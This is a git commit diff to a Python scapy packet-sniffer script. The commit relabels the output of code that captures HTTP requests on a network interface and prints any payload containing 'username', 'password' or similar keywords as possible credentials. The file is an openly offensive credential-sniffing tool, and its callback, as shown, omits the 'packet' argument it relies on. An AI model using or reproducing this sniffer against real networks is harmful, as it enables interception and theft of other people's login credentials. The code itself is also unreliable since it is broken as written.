c1531ef887465a5f8c28451777242114ff2d0c3e
Paul St. Amour <paul35444@aol.com>
2021-03-12 11:11:34 -0600

    -added more info to print statements

--- PacketSniffer.py
+++ PacketSniffer.py
@@ -7,12 +7,14 @@ def sniff(interface):
 #store=False arg tells scapy to not store packets
 #prn arg allows call back func to be executed every time packet is captured
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
-                                                                                       
+                            
+
+
 def process_sniffed_packet():
 #print only HTTPRequest packets
     if packet.haslayer(http.HTTPRequest):
         url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-        print(url)
+        print("[+] HTTP Request >> " + url)
 
 #only displaying packets with Raw layer
         if packet.haslayer(scapy.Raw):
@@ -22,7 +24,7 @@ def process_sniffed_packet():
             keywords = ["username", "user", "login", "password", "pass"]
             for keyword in keywords:
                 if keyword in load:
-                    print(load)
+                    print("\n\n[+] Possible username/password >> " + load + "\n\n")
                     break
 
 #sniff interface (hardcoded)
